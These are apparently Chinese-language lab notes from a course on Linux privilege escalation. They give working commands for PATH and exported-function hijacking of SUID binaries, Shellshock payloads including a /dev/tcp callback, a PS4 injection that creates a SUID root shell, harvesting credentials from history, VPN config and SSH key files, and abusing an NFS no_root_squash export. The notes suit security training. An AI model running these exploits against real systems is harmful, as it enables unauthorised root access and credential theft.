<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127195844994.png?lastModify=1766751620" alt="image-20251127195844994"></p>
<h4 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h4><hr>
<p><strong>普通用户完全能执行</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5290" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-keyword">export</span> <span class="cm-def">PATH</span><span class="cm-operator">=</span>.:<span class="cm-def">$PATH</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><strong>PATH 是当前 shell 的环境变量</strong>，不属于系统特权配置。</li>
<li><strong>这条命令****只影响你自己的会话</strong>（以及从这个会话 fork 出去的子进程），<strong>不会改别的用户或系统路径</strong>。</li>
<li>**退出终端或开新 shell 就失效（除非写进 **<code>\x7e/.bashrc</code> 使其持久化）。</li>
</ul>
<p><strong>但是，它带来的风险需要 root 去防范：</strong></p>
<ul>
<li><strong>如果 root 运行了****不写绝对路径</strong>的脚本&#x2F;程序，而<strong>当前目录</strong>又被你提前放进 <code>PATH</code>，你就能<strong>劫持命令</strong> → <strong>提权</strong>。</li>
<li><strong>所以****安全基线</strong>要求：<ul>
<li><strong>root 的 PATH 永远不要包含 “.”</strong></li>
<li><strong>SUID 程序内部全部使用绝对路径</strong></li>
<li><strong>管理员脚本第一行就 <code>unset PATH</code> 或显式写全路径</strong></li>
</ul>
</li>
</ul>
<hr>
<p><strong>一句话总结</strong></p>
<blockquote>
<p><strong>“普通用户随便 export PATH&#x3D;.:$PATH，这是他的自由；真正的安全责任在 root 侧——别让 root 执行非绝对路径的命令。”</strong></p>
</blockquote>
<h3 id="巧用SUID-shell功能提取-1-version"><a href="#巧用SUID-shell功能提取-1-version" class="headerlink" title="巧用SUID-shell功能提取#1     version&lt;4.2"></a>巧用SUID-shell功能提取#1     version&lt;4.2</h3><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127200416076.png?lastModify=1766751620" alt="image-20251127200416076"></p>
<p><strong>strings查看可读字符串：发现是以绝对路径service的方式启动apache2，，算是把SUID环境变量利用提权修复了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127200721413.png?lastModify=1766751620" alt="image-20251127200721413"></p>
<p><strong>这时，看一下bash的</strong><code>version</code>&#x2F;版本为4.1.5</p>
<p><strong>如果bash version&lt;4.2&#x2F;子版本号4.2-2048，可以在bash中定义函数，然后用路径的组合做函数名，正切合这里的利用方式</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127200943956.png?lastModify=1766751620" alt="image-20251127200943956"></p>
<p>**定义一个函数一般是 **<code>function funcName</code> ,但是因为bash版本&lt;4.2，我们可以用路径的组合做函数名，函数内容就是以执行者（SUID程序的属主root）权限新起bash</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127201635838.png?lastModify=1766751620" alt="image-20251127201635838"></p>
<p><strong>此时函数存在了，我们还要做一个导出，导到环境中。这样在执行的时候，以及在子进程执行的时候，都能够引用这个函数，这样我们就把原有的service命令劫持了</strong></p>
<p><code>explort -f funcName</code>提示导出的是函数，不是变量。**	<strong>导出后他会</strong>覆盖**系统的原service命令，优先执行给他的函数</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127202443943.png?lastModify=1766751620" alt="image-20251127202443943"></p>
<p><strong>原理：bash在执行的时候，对于自身定义或导出的函数优先级 高于 环境变量</strong></p>
<p><strong>本质上和环境变量覆盖差不多，都是更高的优先级进行劫持</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127200721413.png?lastModify=1766751620" alt="image-20251127200721413"></p>
<p><strong>再次执行有s位的该程序即可提权成功  root执行里面的</strong><strong><code>/usr/sbin/service</code></strong>，优先选用了 自定义函数，并执行了函数里面的恶意命令</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127202502804.png?lastModify=1766751620" alt="image-20251127202502804"></p>
<blockquote>
<p><strong>bash 4.2 子版本 ≤ 4.2-2048的其他利用方式</strong></p>
<h3 id="最稳选择：CVE-2014-6271-“Shellshock”"><a href="#最稳选择：CVE-2014-6271-“Shellshock”" class="headerlink" title="最稳选择：CVE-2014-6271 “Shellshock”"></a>最稳选择：CVE-2014-6271 <strong>“Shellshock”</strong></h3><table>
<thead>
<tr>
<th><strong>项</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>影响范围</strong></td>
<td><strong>bash 4.0 ≤ 4.2-2048****全系命中</strong>（4.3 早期也中）</td>
</tr>
<tr>
<td><strong>原理</strong></td>
<td><strong>环境变量转函数定义时未过滤</strong>，导致<strong>变量值直接当代码执行</strong></td>
</tr>
<tr>
<td><strong>利用条件</strong></td>
<td><strong>只要能</strong> <code>export</code>变量并<strong>启动新 bash</strong>（ssh、cgi、git、coproc、crontab 均可）</td>
</tr>
<tr>
<td><strong>提权路径</strong></td>
<td><strong>普通 shell → 通过 Shellshock 注入 → 以目标服务身份（常为 root）执行命令</strong></td>
</tr>
</tbody></table>
<hr>
<h3 id="一、本地复现（纯-shell-场景）"><a href="#一、本地复现（纯-shell-场景）" class="headerlink" title="一、本地复现（纯 shell 场景）"></a>一、本地复现（纯 shell 场景）</h3><ol>
<li><p><strong>确认版本</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5365" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">bash</span> <span class="cm-attribute">--version</span>          <span class="cm-comment"># 输出 4.2.x</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
<li><p><strong>经典验证一行</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5370" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">env <span class="cm-string">'x=() { :;}; /bin/bash -c "id >& /dev/tcp/127.0.0.1/443"'</span> <span class="cm-builtin">bash</span> <span class="cm-attribute">-c</span> :</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><strong>本地监听：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5372" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">nc</span> <span class="cm-attribute">-lvnp</span> <span class="cm-number">443</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
</ol>
<p>**   → 收到 **<strong>uid&#x3D;0(root)</strong> 回连 → 验证存在 Shellshock。</p>
<ol start="3">
<li><strong>直接本地提权</strong>（无需网络）<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5378" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 在当前 bash 里利用</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">env <span class="cm-string">'x=() { :;}; exec /bin/bash -p'</span> <span class="cm-builtin">bash</span> <span class="cm-attribute">-c</span> :</span></pre></div></div></div></div></div><div></div></div></div></pre></li>
</ol>
<p>**   → 新 bash **<strong>真实 uid&#x2F;gid&#x3D;0</strong>，<code>id</code> 显示 root。</p>
</blockquote>
<h3 id="巧用SUID-shell功能提取-2"><a href="#巧用SUID-shell功能提取-2" class="headerlink" title="巧用SUID-shell功能提取#2"></a>巧用SUID-shell功能提取#2</h3><p><strong>跟#1的文件一样，不过利用方式有差别</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127210144083.png?lastModify=1766751620" alt="image-20251127210144083"></p>
<p><strong>4.2版本以下才行</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127211111813.png?lastModify=1766751620" alt="image-20251127211111813"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5388" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><strong>-i 忽略掉当前所有环境变量的选项</strong></p>
<p><strong>SHELLOPTS是环境变量的选项集，可以有多个选项，然后用</strong><code>:</code>分割</p>
<p><strong>xtrace 是shell执行每个命令之前先打印这个命令</strong></p>
<p><strong>PS Prompt String 提示字符串</strong></p>
<blockquote>
<hr>
<h3 id="①-env-i"><a href="#①-env-i" class="headerlink" title="① env -i"></a>① <code>env -i</code></h3><ul>
<li><strong>清空继承的所有环境变量</strong>，只保留后面显式给出的两项。</li>
<li><strong>防止其他变量干扰</strong>，也让 <strong>bash 重新解析环境</strong> → 触发漏洞。</li>
</ul>
<hr>
<h3 id="②-SHELLOPTS-xtrace"><a href="#②-SHELLOPTS-xtrace" class="headerlink" title="② SHELLOPTS=&#39;xtrace&#39;"></a>② <code>SHELLOPTS=&#39;xtrace&#39;</code></h3><ul>
<li><strong>打开 bash 的调试选项（set -x）</strong>。</li>
<li>**旧版本 bash（≤4.2）在 **<strong>解析函数定义前</strong> 会 <strong>先把变量值当代码执行</strong>（Shellshock 本质）。</li>
<li>**因此 **<strong>任何以 <code>() {</code> 开头的字符串都会被执行</strong>。</li>
</ul>
<hr>
<h3 id="③-PS4-cp-bin-bash-tmp-rootbash-chmod-xs-tmp-rootbash"><a href="#③-PS4-cp-bin-bash-tmp-rootbash-chmod-xs-tmp-rootbash" class="headerlink" title="③ PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;"></a>③ <code>PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;</code></h3><ul>
<li><strong>PS4 是 xtrace 的提示符字符串</strong>；默认是 <code>+ </code>。</li>
<li>**这里把 PS4 换成 **<strong>一行反向 shell 命令</strong>：<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5417" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash</span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
</ul>
<p>**  → **<strong>复制一份 bash 到 &#x2F;tmp，并给它 SUID 位</strong>。</p>
<ul>
<li>**由于 **<strong>旧 bash 会先执行 PS4 值</strong>，于是：<ul>
<li><strong>以当前进程身份（root，因为 suid-env2 是 SUID）</strong> 执行复制 + 赋权</li>
<li><strong>&#x2F;tmp&#x2F;rootbash 诞生，属主 root，且带 SUID</strong></li>
</ul>
</li>
</ul>
<hr>
<h3 id="④-usr-local-bin-suid-env2"><a href="#④-usr-local-bin-suid-env2" class="headerlink" title="④ /usr/local/bin/suid-env2"></a>④ <code>/usr/local/bin/suid-env2</code></h3><ul>
<li><strong>属主 root + SUID 位</strong> 的可执行文件。</li>
<li>**内部会 **<strong>再启动 bash</strong>（或 system()&#x2F;popen() 调 bash）。</li>
<li><strong>新 bash 继承 euid&#x3D;0</strong>，于是：<ul>
<li>**解析环境变量 → **<strong>执行 PS4 里的命令</strong> → <strong>&#x2F;tmp&#x2F;rootbash 已 SUID</strong></li>
<li><strong>脚本结束 → 攻击者执行：</strong></li>
</ul>
</li>
</ul>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5443" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">```bash</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">/tmp/rootbash -p</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">```</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">→ **真实 root shell**</span></pre></div></div></div></div></div><div></div></div></div></pre></blockquote>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127211322848.png?lastModify=1766751620" alt="image-20251127211322848"></p>
<p>**成功执行我们的命令，接下来只要 **<code>/tmp/rootbash -p</code> 即可提权成功</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127211459640.png?lastModify=1766751620" alt="image-20251127211459640"></p>
<h2 id="密码和密钥提权-3讲"><a href="#密码和密钥提权-3讲" class="headerlink" title="密码和密钥提权 3讲"></a>密码和密钥提权 3讲</h2><p><strong>列的时候用-li****a</strong>h，不要漏掉隐藏文件</p>
<h3 id="1-密码和密钥历史文件提权"><a href="#1-密码和密钥历史文件提权" class="headerlink" title="1.密码和密钥历史文件提权"></a>1.密码和密钥历史文件提权</h3><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127211856612.png?lastModify=1766751620" alt="image-20251127211856612"></p>
<p><code>history</code>查看历史命令，发现有用户登录MySQL数据库的用户名：root ；密码：password123</p>
<p><strong>尝试****密码复用的碰撞</strong>： 登录MySQL的密码会不会是系统登录密码</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127212119165.png?lastModify=1766751620" alt="image-20251127212119165"></p>
<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h4><p>**如果比较长，或历史记录以不同的方式进行存储  **<code>cat ~/.*history | less </code> 查找当前用户家目录下所有的history相关的文件</p>
<p><strong>或者</strong><code>find ~ -iname &quot;*history*&quot; 2&gt;/dev/null</code>	**# 把「目录也列出来」方便深入，**<strong>常接 <code>| xargs strings</code> 快速看敏感命令</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127212212462.png?lastModify=1766751620" alt="image-20251127212212462"></p>
<p><code>viminfo</code>在进行凭据&#x2F;密码敏感文件编辑的时候，可能会存储一些信息</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127213033620.png?lastModify=1766751620" alt="image-20251127213033620"></p>
<h3 id="2-密码密钥配置文件查看提权"><a href="#2-密码密钥配置文件查看提权" class="headerlink" title="2.密码密钥配置文件查看提权"></a>2.密码密钥配置文件查看提权</h3><p><strong>信息枚举过程中，一定要对常用的或枚举中发现的应用的配置文件进行查找</strong></p>
<p><strong>典型的比如：</strong></p>
<ul>
<li><strong>有内容管理系统&#x2F;网站的情况下，重点查看数据库的配置文件</strong></li>
<li><strong>有用户家目录的情况下，要看是否有VPN的配置文件，或者是SSH的配置文件</strong></li>
</ul>
<p><strong>这里在用户家目录里 <strong><code>ls -liah</code>列出来<code>myvpn.ovpn</code>配置文件，要重点查看（列的时候用-li</strong>a</strong>h，不要漏掉隐藏文件）</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127213701658.png?lastModify=1766751620" alt="image-20251127213701658"></p>
<p><strong>这****只</strong>是配置文件的一例，还要关注 <strong>网站，应用，可能连接数据库的各种配置文件</strong></p>
<p><strong>不是漫天的想，而是通过枚举看到哪些应用的数据库连接文件通过公共信息搜索，找到一些信息去排查</strong></p>
<p><code>myvpn.ovpn</code>里找到一个 <code>auth-user-pass</code>路径，接着追踪下去</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127214256368.png?lastModify=1766751620" alt="image-20251127214256368"></p>
<p><strong>直接提示了root的用户名密码</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127214405397.png?lastModify=1766751620" alt="image-20251127214405397"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127214449486.png?lastModify=1766751620" alt="image-20251127214449486"></p>
<p><strong>简单但不要忘掉。看哪里的配置文件也是有经验的</strong></p>
<h3 id="3-SSH密钥敏感信息提权"><a href="#3-SSH密钥敏感信息提权" class="headerlink" title="3.SSH密钥敏感信息提权"></a>3.SSH密钥敏感信息提权</h3><p><strong>枚举过程中，一定要看用户家目录是否有SSH密钥相关的敏感信息</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127214752012.png?lastModify=1766751620" alt="image-20251127214752012"></p>
<p><strong>也要想到系统根目录下有没有SSH相关文件</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127214836618.png?lastModify=1766751620" alt="image-20251127214836618"></p>
<p><strong>为什么会想到根目录：</strong></p>
<p><strong>因为SSH不但高权限用户可以使用，我们低权限用户也可能允许使用SSH密钥这种方式进行登录</strong></p>
<p><strong>这里看到有</strong><code>.ssh</code>的隐藏文件，切换到该目录下，看到有 <code>root_key</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127215112157.png?lastModify=1766751620" alt="image-20251127215112157"></p>
<p><strong>读一下，正好是私钥，复制下来</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127215215601.png?lastModify=1766751620" alt="image-20251127215215601"></p>
<p><strong>拿到kali中保存，既然是私钥，那就试试能不能SSH登录高权限用户，kali使用前记得给权限600以上就行</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127215425028.png?lastModify=1766751620" alt="image-20251127215425028"></p>
<p><strong>这里连接的时候说，缺少密钥的算法类型，给他</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127215614773.png?lastModify=1766751620" alt="image-20251127215614773"></p>
<p><strong>他又说没有共同的签名支持，缺少pubkey公钥类型，给他</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251127215809496.png?lastModify=1766751620" alt="image-20251127215809496"></p>
<p><strong>成功SSH登录root账户</strong></p>
<p><strong>对于查找到的密钥文件，不论是公钥还是私钥，都有进一步尝试的价值</strong></p>
<h2 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h2><p>**在 Linux 中，**<strong>NFS</strong> 是 <strong>Network File System</strong>（网络文件系统）的缩写，是一种由 <strong>Sun Microsystems</strong>（现为 Oracle）开发的分布式文件系统协议，允许客户端计算机通过网络像访问本地文件一样访问远程服务器上的文件。</p>
<hr>
<p><strong>✅ 一句话总结：</strong></p>
<blockquote>
<p><strong>NFS 让你可以把远程服务器的目录挂载到本地，像使用本地硬盘一样使用它。</strong></p>
<p><strong>NFS 就是 Linux 下的“网络共享文件夹”，简单高效，适合局域网内多台 Linux 机器共享文件。</strong></p>
<p><strong>可以用于信息搜集撕口子，也能提权</strong></p>
</blockquote>
<p><strong>枚举的时候看</strong><code>cat /etc/exports</code>是否有NFS服务（nmap做系统枚举的时候也能看到相关信息）</p>
<blockquote>
<p><code>/etc/exports</code> 是 <strong>NFS 服务端的“共享目录白名单”</strong></p>
</blockquote>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128183950251.png?lastModify=1766751620" alt="image-20251128183950251"></p>
<p><strong>真正生效的“致命一行”</strong></p>
<blockquote>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5534" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">/tmp          *(rw,sync,insecure,no_root_squash,no_subtree_check)</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><strong><code>/tmp</code></strong> →共享路径， 服务器把 <strong>全局可写目录</strong> 共享出去；</li>
<li><strong><code>\*</code></strong> → <strong>任意 IP</strong> 都能挂载（<strong>无源限制</strong>）；</li>
<li><strong><code>rw</code></strong> → <strong>都可读写</strong>；</li>
<li><strong><code>sync</code></strong> → <strong>同步</strong>，所有操作都立即生效</li>
<li><strong><code>insecure</code></strong> → 允许使用非保留的端口进行连接 <strong>&gt;1024 源端口</strong>（客户端 NAT 场景）；</li>
<li><strong><code>no_root_squash</code></strong> → <strong>客户端 root ≡ 服务器 root</strong>（<strong>提权金钥匙</strong>）；不希望将root用户请求映射为匿名用户，即允许以root用户方式连接NFS  &#x2F;tmp这个目录下</li>
<li><strong><code>no_subtree_check</code></strong> → 性能优化，安全校验关闭。</li>
</ul>
</blockquote>
<p><strong>在kali中，切换到root模式，这样确保连接的时候是以root身份进行连接</strong></p>
<p><strong>然后在</strong><code>/tmp</code>目录下建立任意名称的目录，这里叫 <code>nfs</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128185227283.png?lastModify=1766751620" alt="image-20251128185227283"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5553" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">mkdir</span> /tmp/nfs</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mount <span class="cm-attribute">-o</span> rw<span class="cm-def">,vers</span><span class="cm-operator">=</span><span class="cm-number">3</span> 靶机IP:/tmp /tmp/nfs</span></pre></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><strong>然后进行挂载</strong><code>mount</code> **	**</li>
<li><strong>选项</strong><code>-o</code>：允许读写（我们要在里面写入反弹shell）；指定NFS的版本 <code>vers=2/3</code>（避免他是4,安全机制和共享机制有些差别）</li>
<li><strong>接NFS的服务地址</strong></li>
<li><strong>挂载到我们刚才建立的</strong><code>/tmp/nfs</code>路径下</li>
</ul>
<p><strong>结果是创建了一个****软连接</strong>，挂载成功。<strong>挂载后</strong>，你对 <code>/tmp/nfs</code> 的所有读写 <strong>直接操作靶机硬盘</strong>。</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128185355110.png?lastModify=1766751620" alt="image-20251128185355110"></p>
<p><strong>可以看到</strong><code>/tmp/nfs</code>目录下有这些文件，我们不用管，我们只想写入反弹shell的命令</p>
<p><strong>在root用户下用</strong><code>msfvenom</code>生成我们想要的最简命令脚本，这样脚本就有root属主的权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128185558352.png?lastModify=1766751620" alt="image-20251128185558352"></p>
